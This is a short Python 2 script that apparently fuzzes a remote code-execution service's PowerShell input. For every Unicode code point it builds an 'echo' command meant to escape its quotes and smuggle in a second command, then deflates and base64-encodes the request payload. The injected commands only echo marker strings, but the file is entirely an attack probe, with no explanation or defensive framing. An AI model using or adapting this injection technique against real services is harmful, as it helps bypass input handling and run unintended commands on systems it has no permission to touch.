from urllib import quote_plus, quote, unquote
import base64
import zlib
import sys


def js_string_to_byte(data):
    return bytes(data)


def js_bytes_to_string(data):
    return data.decode('iso-8859-1')


def js_btoa(data):
    return base64.b64encode(data)


def js_atob(data):
    return base64.b64decode(data)


def pako_inflate_raw(data):
    decompress = zlib.decompressobj(-15)
    decompressed_data = decompress.decompress(data)
    decompressed_data += decompress.flush()
    return decompressed_data



def pako_deflate_raw(data):
    compress = zlib.compressobj(
        zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15, 8,
        zlib.Z_DEFAULT_STRATEGY)
    compressed_data = compress.compress(js_string_to_byte(data))
    compressed_data += compress.flush()
    return compressed_data


for i in xrange(0x0000,0xffff):
    exec('mal=u"\\u'+"0"*(4-len(hex(i).replace("0x","")))+hex(i).replace("0x","")+'"')
    mal = mal.encode("utf-8")
    inject_cmd = 'echo \'0xd00'+mal+';;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;echo "ff9111999999"'+mal+'\''
    input_ss = 'Vlang\x001\x00powershell\x00F.code.tio\x00'+str(len(inject_cmd))+'\x00'+inject_cmd+'F.input.tio\x000\x00Vargs\x000\x00R'
    # print repr(input_ss)
    defl = pako_deflate_raw(input_ss)
    print base64.b64encode(defl)
